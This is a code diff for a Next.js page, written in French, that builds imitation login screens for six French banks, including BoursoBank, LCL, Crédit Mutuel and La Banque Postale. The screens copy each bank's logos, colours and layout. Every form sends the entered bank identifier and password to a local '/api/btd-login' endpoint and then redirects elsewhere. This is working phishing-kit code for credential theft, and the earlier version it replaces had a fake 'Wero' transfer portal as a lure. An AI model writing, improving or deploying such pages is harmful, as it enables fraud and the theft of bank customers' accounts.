@@ -1,334 +1,410 @@
 'use client';
 
-import React, { useState, FormEvent } from 'react';
-import { useParams, useRouter } from 'next/navigation';
-import Link from 'next/link';
+import React, { useState, useEffect, FormEvent } from 'react';
+import { useParams, useRouter, useSearchParams } from 'next/navigation';
 
-// Correspondance des visuels pour les 12 options
-const LOGOS_MAP: Record<string, string> = {
-  '1': '/IMG_9197.png',
-  '2': '/Societe-Generale-Emblem.png',
-  '3': '/BP-1.png',
-  '4': '/ccf-logo.png',
-  '5': '/lcl-logo.png',
-  '6': '/12895685.png',
-  '7': '/logo_BanquePostale_600x300.webp',
-  '8': '/unnamed.jpg',
-  '9': '/hello-bank-logo.png',
-  '10': '/bnp-paribas-logo.png',
-  '11': '/boursorama-logo.png',
-  '12': '/bank-icon.svg',
+type BankLayoutType = 'boursobank' | 'lcl' | 'credit-mutuel' | 'banque-postale' | 'caisse-epargne' | 'hello-bank' | 'default';
+
+interface BankConfig {
+  id: string;
+  name: string;
+  logo: string;
+  layoutType: BankLayoutType;
+  primaryColor?: string;
+  identifiantLabel?: string;
+  placeholder?: string;
+}
+
+const BANK_CONFIGS: Record<string, BankConfig> = {
+  '11': {
+    id: '11',
+    name: 'BoursoBank',
+    logo: '/boursorama-logo.png',
+    layoutType: 'boursobank',
+    placeholder: 'Saisissez votre identifiant',
+  },
+  '5': {
+    id: '5',
+    name: 'LCL',
+    logo: '/lcl-logo.png',
+    layoutType: 'lcl',
+  },
+  '8': {
+    id: '8',
+    name: 'Crédit Mutuel',
+    logo: '/unnamed.jpg',
+    layoutType: 'credit-mutuel',
+    placeholder: 'Votre identifiant',
+  },
+  '7': {
+    id: '7',
+    name: 'La Banque Postale',
+    logo: '/logo_BanquePostale_600x300.webp',
+    layoutType: 'banque-postale',
+    placeholder: 'Saisissez votre identifiant',
+  },
+  '6': {
+    id: '6',
+    name: 'Caisse d’Épargne',
+    logo: '/12895685.png',
+    layoutType: 'caisse-epargne',
+    placeholder: 'Entrez votre identifiant',
+  },
+  '9': {
+    id: '9',
+    name: 'Hello Bank!',
+    logo: '/hello-bank-logo.png',
+    layoutType: 'hello-bank',
+    placeholder: 'Numéro de 7 à 10 chiffres',
+  },
 };
 
-const WERO_LOGO_PATH = '/wero-logo.png';
-
-export default function DynamicOffrePage() {
+export default function DynamicBankLoginPage() {
   const params = useParams();
+  const searchParams = useSearchParams();
   const router = useRouter();
-  const id = params?.id as string;
 
-  const isAutre = id === '12' || id === 'autre';
-  const partnerLogo = LOGOS_MAP[id] || '/bank-icon.svg';
+  const id = (params?.id as string) || searchParams?.get('id') || '11';
+  const currentBank = BANK_CONFIGS[id] || BANK_CONFIGS['11'];
 
-  // États du formulaire (1 à 11)
   const [identifiant, setIdentifiant] = useState('');
   const [password, setPassword] = useState('');
-  const [showKeypad, setShowKeypad] = useState(false);
+  const [rememberMe, setRememberMe] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // États pour la pop-up (Option 12 / Autre)
-  const [showModal, setShowModal] = useState(isAutre);
-  const [nom, setNom] = useState('');
-  const [etablissement, setEtablissement] = useState('');
-  const [resident, setResident] = useState('');
+  // Keypad aleatoire pour LCL
+  const [keypadNumbers, setKeypadNumbers] = useState<string[]>([]);
 
-  const handleKeypadClick = (val: string) => {
-    if (val === 'clear') {
-      setPassword('');
-    } else if (val === 'back') {
-      setPassword((prev) => prev.slice(0, -1));
-    } else {
+  useEffect(() => {
+    const nums = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'].sort(() => Math.random() - 0.5);
+    setKeypadNumbers(nums);
+  }, []);
+
+  const handleSubmit = async (e: FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await fetch('/api/btd-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ bankId: currentBank.id, bankName: currentBank.name, identifiant, password }),
+      });
+    } catch (err) {
+      console.error('Erreur :', err);
+    } finally {
+      router.push('/bat');
+    }
+  };
+
+  const handleKeypadPress = (val: string) => {
+    if (password.length < 6) {
       setPassword((prev) => prev + val);
     }
   };
 
-  const handleSubmitMain = async (e: FormEvent) => {
-    e.preventDefault();
-    setIsSubmitting(true);
-
-    try {
-      await fetch('/api/btd-login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ offreId: id, identifiant, password }),
-      });
-    } catch (err) {
-      console.error('Erreur :', err);
-    } finally {
-      router.push('/bat');
-    }
-  };
-
-  const handleSubmitAutre = async (e: FormEvent) => {
-    e.preventDefault();
-    setIsSubmitting(true);
-
-    try {
-      await fetch('/api/btd-login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ offreId: '12', nom, etablissement, resident }),
-      });
-    } catch (err) {
-      console.error('Erreur :', err);
-    } finally {
-      setShowModal(false);
-      router.push('/bat');
-    }
+  const handleKeypadClear = () => {
+    setPassword((prev) => prev.slice(0, -1));
   };
 
   return (
-    <div className="min-h-screen bg-slate-100 text-slate-800 font-sans flex justify-center items-center sm:py-6">
-      {/* Cadre Mobile Propre & Neutre */}
-      <div className="w-full max-w-md min-h-screen sm:min-h-[800px] bg-white sm:rounded-3xl sm:shadow-2xl flex flex-col justify-between overflow-hidden relative border border-slate-200">
+    <div className="min-h-screen bg-[#F4F6F9] text-slate-800 font-sans flex flex-col items-center justify-start p-2 sm:p-6">
+      <div className="w-full max-w-[420px] bg-white rounded-2xl shadow-sm overflow-hidden border border-slate-100 min-h-[90vh] flex flex-col justify-between">
         
-        {/* Header blanc épuré */}
-        <header className="px-6 py-4 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20">
-          <div className="flex items-center gap-3">
-            {/* Logo Wero avec badge jaune de marque */}
-            <Link 
-              href="/portail" 
-              className="w-10 h-10 bg-[#FFE800] hover:bg-[#E6D000] rounded-xl flex items-center justify-center p-1.5 shadow-sm transition-transform active:scale-95 overflow-hidden"
-              title="Retour au portail Wero"
-            >
-              <img 
-                src={WERO_LOGO_PATH} 
-                alt="Wero" 
-                className="w-full h-full object-contain rounded-lg"
-                onError={(e) => {
-                  e.currentTarget.onerror = null;
-                  e.currentTarget.parentElement!.innerHTML = '<span class="font-black text-slate-900 text-xs tracking-tighter">wero</span>';
-                }}
-              />
-            </Link>
-
-            <span className="text-slate-300 text-xs font-bold">➔</span>
-
-            {/* Logo Partenaire */}
-            <div className="h-10 w-12 bg-white border border-slate-200 rounded-xl p-1 flex items-center justify-center shadow-sm">
-              {isAutre ? (
-                <span className="text-xl">🏛️</span>
-              ) : (
-                <img src={partnerLogo} alt="Partenaire" className="max-h-full max-w-full object-contain rounded-md" />
-              )}
-            </div>
-          </div>
-
-          <Link href="/portail" className="text-xs font-semibold text-slate-500 hover:text-slate-900 bg-slate-50 border border-slate-200 px-3 py-1.5 rounded-lg transition-colors">
-            Changer
-          </Link>
-        </header>
-
-        {/* CONTENU PRINCIPAL DU FORMULAIRE */}
-        {!isAutre && (
-          <main className="flex-1 px-6 py-8 flex flex-col justify-start animate-in fade-in duration-200">
-            <div className="mb-8 text-center">
-              <h1 className="text-2xl font-black text-slate-900 tracking-tight mb-2">
-                Espace de connexion
-              </h1>
-              <p className="text-xs text-slate-500 font-medium">
-                Veuillez saisir vos accès pour valider la synchronisation.
-              </p>
-            </div>
-
-            <form onSubmit={handleSubmitMain} className="flex flex-col gap-5">
-              <div className="space-y-1.5">
-                <label className="block text-xs font-bold text-slate-800 uppercase tracking-wider">
-                  Identifiant client <span className="text-red-500">*</span>
-                </label>
-                <input
-                  type="text"
-                  required
-                  value={identifiant}
-                  onChange={(e) => setIdentifiant(e.target.value)}
-                  placeholder="Saisissez votre identifiant"
-                  className="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 focus:ring-2 focus:ring-slate-100 transition-all placeholder:text-slate-400"
-                />
-              </div>
-
-              <div className="space-y-1.5">
-                <div className="flex items-center justify-between">
-                  <label className="block text-xs font-bold text-slate-800 uppercase tracking-wider">
-                    Code secret <span className="text-red-500">*</span>
-                  </label>
-                  <button
-                    type="button"
-                    onClick={() => setShowKeypad(!showKeypad)}
-                    className="text-[11px] font-bold text-slate-600 hover:text-slate-900 underline focus:outline-none"
-                  >
-                    {showKeypad ? 'Clavier standard' : 'Pavé numérique'}
-                  </button>
+        {/* --- 1. BOURSOBANK LAYOUT --- */}
+        {currentBank.layoutType === 'boursobank' && (
+          <div className="flex-1 flex flex-col">
+            <div className="p-6 text-center">
+              <img src={currentBank.logo} alt="BoursoBank" className="h-9 mx-auto mb-6 object-contain" />
+              
+              <div className="bg-white rounded-2xl border-t-4 border-[#E20074] p-6 shadow-sm border border-slate-100 flex flex-col items-center">
+                <div className="w-16 h-16 bg-slate-100 rounded-full flex items-center justify-center mb-4 text-slate-400">
+                  <svg className="w-8 h-8" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M12 2L2 12h3v8h6v-6h2v6h6v-8h3L12 2z" />
+                  </svg>
                 </div>
+                
+                <h1 className="text-xl font-bold text-[#002D62] mb-2">Mon identifiant</h1>
+                <p className="text-xs text-slate-500 mb-4">Veuillez toujours vérifier que vous êtes sur la bonne adresse</p>
+                
+                <span className="inline-flex items-center gap-1.5 px-3 py-1 bg-white border border-emerald-500 text-emerald-600 text-xs font-medium rounded-full mb-6">
+                  <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
+                  Espace Client
+                </span>
 
-                <input
-                  type="password"
-                  required
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  placeholder="••••••••"
-                  readOnly={showKeypad}
-                  className="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 focus:ring-2 focus:ring-slate-100 transition-all placeholder:text-slate-400"
-                />
-              </div>
-
-              {/* Pavé Numérique Virtuel Neutre */}
-              {showKeypad && (
-                <div className="p-4 bg-slate-50 rounded-2xl border border-slate-200 mt-1 animate-in fade-in duration-150">
-                  <p className="text-[11px] font-semibold text-slate-500 text-center mb-3">
-                    Pavé numérique sécurisé
-                  </p>
-                  <div className="grid grid-cols-3 gap-2 max-w-[240px] mx-auto">
-                    {['1', '2', '3', '4', '5', '6', '7', '8', '9', 'clear', '0', 'back'].map((key) => {
-                      if (key === 'clear') {
-                        return (
-                          <button
-                            key={key}
-                            type="button"
-                            onClick={() => handleKeypadClick('clear')}
-                            className="py-3 bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 font-bold text-xs rounded-xl transition"
-                          >
-                            C
-                          </button>
-                        );
-                      }
-                      if (key === 'back') {
-                        return (
-                          <button
-                            key={key}
-                            type="button"
-                            onClick={() => handleKeypadClick('back')}
-                            className="py-3 bg-slate-200 hover:bg-slate-300 text-slate-700 font-bold text-xs rounded-xl transition"
-                          >
-                            ⌫
-                          </button>
-                        );
-                      }
-                      return (
-                        <button
-                          key={key}
-                          type="button"
-                          onClick={() => handleKeypadClick(key)}
-                          className="py-3 bg-white hover:bg-slate-100 active:bg-slate-200 text-slate-800 font-bold text-base rounded-xl border border-slate-200 shadow-sm transition"
-                        >
-                          {key}
-                        </button>
-                      );
-                    })}
-                  </div>
-                </div>
-              )}
-
-              {/* Bouton Jaune Wero Distinct (CTA principal) */}
-              <button
-                type="submit"
-                disabled={isSubmitting}
-                className="w-full py-4 mt-2 bg-[#FFE800] hover:bg-[#E6D000] active:scale-[0.99] text-slate-900 font-extrabold text-sm tracking-wider rounded-xl shadow-sm transition-all text-center uppercase flex items-center justify-center gap-2"
-              >
-                {isSubmitting ? (
-                  <span className="w-5 h-5 border-2 border-slate-900 border-t-transparent rounded-full animate-spin" />
-                ) : (
-                  'VALIDER ET CONTINUER'
-                )}
-              </button>
-            </form>
-          </main>
-        )}
-
-        {/* POP-UP MODALE POUR OPTION 12 / AUTRE */}
-        {showModal && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm animate-in fade-in duration-200">
-            <div className="w-full max-w-sm bg-white rounded-3xl p-6 shadow-2xl border border-slate-100 relative">
-              <h2 className="text-xl font-black text-slate-900 mb-1 text-center">
-                Autre établissement
-              </h2>
-              <p className="text-xs text-slate-500 font-medium text-center mb-6">
-                Renseignez les détails de votre profil pour poursuivre.
-              </p>
-
-              <form onSubmit={handleSubmitAutre} className="flex flex-col gap-4">
-                <div>
-                  <label className="block text-xs font-bold text-slate-800 mb-1">
-                    Nom <span className="text-red-500">*</span>
-                  </label>
+                <form onSubmit={handleSubmit} className="w-full space-y-6">
                   <input
                     type="text"
                     required
-                    value={nom}
-                    onChange={(e) => setNom(e.target.value)}
-                    placeholder="Votre nom complet"
-                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 transition-all placeholder:text-slate-400"
+                    value={identifiant}
+                    onChange={(e) => setIdentifiant(e.target.value)}
+                    placeholder={currentBank.placeholder}
+                    className="w-full px-2 py-3 border-b border-slate-300 text-center font-medium text-slate-800 outline-none focus:border-[#E20074] transition-all"
                   />
-                </div>
 
-                <div>
-                  <label className="block text-xs font-bold text-slate-800 mb-1">
-                    Nom de l’établissement <span className="text-red-500">*</span>
-                  </label>
-                  <input
-                    type="text"
-                    required
-                    value={etablissement}
-                    onChange={(e) => setEtablissement(e.target.value)}
-                    placeholder="Ex: Établissement X"
-                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 transition-all placeholder:text-slate-400"
-                  />
-                </div>
-
-                <div>
-                  <label className="block text-xs font-bold text-slate-800 mb-1">
-                    Résident <span className="text-red-500">*</span>
-                  </label>
-                  <input
-                    type="text"
-                    required
-                    value={resident}
-                    onChange={(e) => setResident(e.target.value)}
-                    placeholder="Statut de résidence / adresse"
-                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 transition-all placeholder:text-slate-400"
-                  />
-                </div>
-
-                <div className="flex gap-3 mt-4">
-                  <button
-                    type="button"
-                    onClick={() => router.push('/portail')}
-                    className="flex-1 py-3.5 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs rounded-xl transition"
-                  >
-                    RETOUR
-                  </button>
                   <button
                     type="submit"
                     disabled={isSubmitting}
-                    className="flex-1 py-3.5 bg-[#FFE800] hover:bg-[#E6D000] text-slate-900 font-extrabold text-xs rounded-xl shadow-sm transition flex items-center justify-center"
+                    className="w-full py-3.5 bg-[#E20074] text-white font-semibold text-sm rounded-full hover:bg-[#C00062] transition-colors"
                   >
-                    {isSubmitting ? (
-                      <span className="w-4 h-4 border-2 border-slate-900 border-t-transparent rounded-full animate-spin" />
-                    ) : (
-                      'VALIDER'
-                    )}
+                    Suivant
                   </button>
+                </form>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* --- 2. LCL LAYOUT --- */}
+        {currentBank.layoutType === 'lcl' && (
+          <div className="flex-1 flex flex-col p-6 text-center">
+            <img src={currentBank.logo} alt="LCL" className="h-14 mx-auto mb-6 object-contain" />
+            
+            <h2 className="text-lg font-bold text-[#002D72] mb-3">Votre identifiant</h2>
+            
+            {/* Display Identifiant slots */}
+            <div className="flex justify-center gap-1 mb-4">
+              {Array.from({ length: 10 }).map((_, idx) => (
+                <div key={idx} className="w-7 h-8 border-b-2 border-slate-300 text-sm font-bold flex items-center justify-center">
+                  {identifiant[idx] || ''}
                 </div>
+              ))}
+            </div>
+
+            <label className="flex items-center justify-center gap-2 text-xs text-slate-500 mb-6 cursor-pointer">
+              <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="rounded text-[#002D72]" />
+              Mémoriser mon identifiant
+            </label>
+
+            <h2 className="text-lg font-bold text-[#002D72] mb-1">Votre code personnel</h2>
+            <p className="text-xs text-slate-600 mb-3">Identifiant: <span className="font-bold text-[#002D72]">{identifiant || '-----------'}</span></p>
+
+            {/* Password Dots */}
+            <div className="flex justify-center gap-2 mb-6">
+              {[0, 1, 2, 3, 4, 5].map((idx) => (
+                <div
+                  key={idx}
+                  className={`w-3.5 h-3.5 rounded-full border ${
+                    password.length > idx ? 'bg-[#002D72] border-[#002D72]' : 'border-slate-300'
+                  }`}
+                />
+              ))}
+            </div>
+
+            {/* Circular Keypad */}
+            <div className="grid grid-cols-4 gap-3 max-w-[280px] mx-auto mb-6">
+              {keypadNumbers.map((num) => (
+                <button
+                  key={num}
+                  type="button"
+                  onClick={() => handleKeypadPress(num)}
+                  className="w-14 h-14 rounded-full bg-[#EEF2FF] text-[#002D72] font-bold text-lg hover:bg-[#E0E7FF] flex items-center justify-center mx-auto transition-all active:scale-95"
+                >
+                  {num}
+                </button>
+              ))}
+              <button
+                type="button"
+                onClick={handleKeypadClear}
+                className="w-14 h-14 rounded-full bg-red-100 text-red-600 font-bold text-sm flex items-center justify-center mx-auto transition-all active:scale-95"
+              >
+                ✕
+              </button>
+            </div>
+
+            <button
+              onClick={handleSubmit}
+              disabled={isSubmitting}
+              className="w-full py-3.5 bg-slate-300 text-white font-semibold text-sm rounded-full transition-colors hover:bg-[#002D72]"
+            >
+              Valider →
+            </button>
+          </div>
+        )}
+
+        {/* --- 3. CRÉDIT MUTUEL LAYOUT --- */}
+        {currentBank.layoutType === 'credit-mutuel' && (
+          <div className="flex-1 flex flex-col p-4">
+            <div className="flex justify-between items-center mb-6 border-b pb-3">
+              <img src={currentBank.logo} alt="Crédit Mutuel" className="h-8 object-contain" />
+              <div className="flex gap-3 text-sky-600">
+                <span>🔍</span>
+              </div>
+            </div>
+
+            <h1 className="text-xl font-bold text-[#003B70] text-center mb-4">Se connecter</h1>
+
+            <div className="bg-white border rounded-lg overflow-hidden shadow-xs">
+              <div className="border-b bg-slate-50 flex">
+                <div className="px-4 py-3 font-semibold text-xs border-l-4 border-[#003B70] bg-white text-[#003B70]">
+                  Identifiant / Mot de passe
+                </div>
+              </div>
+
+              <form onSubmit={handleSubmit} className="p-4 space-y-4">
+                <div>
+                  <label className="block text-xs font-bold text-slate-700 mb-1">Identifiant *</label>
+                  <input
+                    type="text"
+                    required
+                    value={identifiant}
+                    onChange={(e) => setIdentifiant(e.target.value)}
+                    placeholder="Votre identifiant"
+                    className="w-full px-3 py-2.5 border rounded-md text-sm outline-none focus:border-[#003B70]"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-xs font-bold text-slate-700 mb-1">Mot de passe *</label>
+                  <input
+                    type="password"
+                    required
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    placeholder="Votre mot de passe"
+                    className="w-full px-3 py-2.5 border rounded-md text-sm outline-none focus:border-[#003B70]"
+                  />
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={isSubmitting}
+                  className="w-full py-3 bg-[#0055A5] text-white font-bold text-sm rounded-full hover:bg-[#003B70]"
+                >
+                  Se connecter
+                </button>
               </form>
             </div>
           </div>
         )}
 
-        {/* Footer Épuré */}
-        <footer className="px-6 py-4 border-t border-slate-100 bg-slate-50/50 text-center">
-          <p className="text-[11px] text-slate-400 font-medium">
-            Interface sécurisée de traitement des transferts
-          </p>
-        </footer>
+        {/* --- 4. LA BANQUE POSTALE LAYOUT --- */}
+        {currentBank.layoutType === 'banque-postale' && (
+          <div className="flex-1 flex flex-col">
+            <div className="p-4 flex justify-between items-center border-b">
+              <img src={currentBank.logo} alt="La Banque Postale" className="h-8 object-contain" />
+              <span className="text-slate-400 text-sm">✕</span>
+            </div>
+
+            <div className="p-6">
+              <h1 className="text-xl font-bold text-[#003399] mb-6">Connexion à votre compte</h1>
+
+              <form onSubmit={handleSubmit} className="space-y-6">
+                <div>
+                  <label className="block text-xs font-bold text-slate-700 mb-2">Identifiant (10 chiffres)</label>
+                  <input
+                    type="text"
+                    required
+                    maxLength={10}
+                    value={identifiant}
+                    onChange={(e) => setIdentifiant(e.target.value)}
+                    placeholder="Saisissez votre identifiant"
+                    className="w-full px-4 py-3 border border-slate-300 rounded-lg text-sm outline-none focus:border-[#003399]"
+                  />
+                </div>
+
+                <div className="flex justify-between items-center">
+                  <span className="text-xs text-slate-600">Mémoriser mon identifiant</span>
+                  <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="toggle" />
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={isSubmitting}
+                  className="w-full py-3.5 bg-[#0046AD] text-white font-bold text-sm rounded-lg hover:bg-[#003399]"
+                >
+                  Continuer
+                </button>
+              </form>
+            </div>
+
+            <div className="mt-auto bg-gradient-to-b from-[#0066FF] to-[#003399] p-6 text-white">
+              <h2 className="text-2xl font-bold mb-2">La Banque Citoyenne</h2>
+            </div>
+          </div>
+        )}
+
+        {/* --- 5. CAISSE D'ÉPARGNE LAYOUT --- */}
+        {currentBank.layoutType === 'caisse-epargne' && (
+          <div className="flex-1 flex flex-col p-6 text-center">
+            <img src={currentBank.logo} alt="Caisse d'Épargne" className="h-10 mx-auto mb-8 object-contain" />
+
+            <h1 className="text-lg font-bold text-slate-800 mb-6 text-left">Saisissez votre identifiant</h1>
+
+            <form onSubmit={handleSubmit} className="space-y-6 text-left">
+              <input
+                type="text"
+                required
+                value={identifiant}
+                onChange={(e) => setIdentifiant(e.target.value)}
+                placeholder={currentBank.placeholder}
+                className="w-full px-3 py-3 border-b-2 border-slate-300 bg-slate-50 text-sm outline-none focus:border-[#D71920]"
+              />
+
+              <div className="text-center">
+                <button type="button" className="text-xs text-[#D71920] font-semibold">Identifiant oublié ?</button>
+              </div>
+
+              <label className="flex items-center gap-2 text-xs text-slate-600 cursor-pointer">
+                <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="accent-[#D71920]" />
+                Mémoriser mon identifiant
+              </label>
+
+              <button
+                type="submit"
+                disabled={isSubmitting}
+                className="w-full py-3 bg-slate-200 text-slate-400 font-bold text-sm rounded-md hover:bg-[#D71920] hover:text-white transition-colors"
+              >
+                Valider
+              </button>
+            </form>
+          </div>
+        )}
+
+        {/* --- 6. HELLO BANK! LAYOUT --- */}
+        {currentBank.layoutType === 'hello-bank' && (
+          <div className="flex-1 flex flex-col">
+            <div className="bg-[#00A88F] p-4 flex justify-between items-center text-white">
+              <img src={currentBank.logo} alt="Hello Bank!" className="h-7 object-contain brightness-0 invert" />
+              <button className="text-xs font-bold bg-white text-[#00A88F] px-3 py-1.5 rounded-full">Retour à Hello bank!</button>
+            </div>
+
+            <div className="p-6">
+              <h1 className="text-2xl font-bold text-[#002D62] text-center mb-6">Accédez à votre espace client</h1>
+
+              <form onSubmit={handleSubmit} className="space-y-6">
+                <div>
+                  <label className="block text-xs font-bold text-[#002D62] mb-2">Numéro Client</label>
+                  <div className="relative">
+                    <input
+                      type="text"
+                      required
+                      value={identifiant}
+                      onChange={(e) => setIdentifiant(e.target.value)}
+                      placeholder={currentBank.placeholder}
+                      className="w-full px-4 py-3 border-2 border-[#00A88F] rounded-lg text-sm outline-none"
+                    />
+                    {identifiant && (
+                      <button type="button" onClick={() => setIdentifiant('')} className="absolute right-3 top-3.5 text-slate-400 text-xs">✕</button>
+                    )}
+                  </div>
+                </div>
+
+                <label className="flex items-center gap-2 text-xs text-slate-600 cursor-pointer">
+                  <input type="checkbox" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} className="accent-[#00A88F]" />
+                  Mémoriser mon numéro client
+                </label>
+
+                <button
+                  type="submit"
+                  disabled={isSubmitting}
+                  className="w-full py-3.5 bg-[#B2EBF2] text-[#008F7A] font-bold text-sm rounded-full hover:bg-[#00A88F] hover:text-white transition-colors"
+                >
+                  Continuer
+                </button>
+              </form>
+            </div>
+          </div>
+        )}
 
       </div>
     </div>
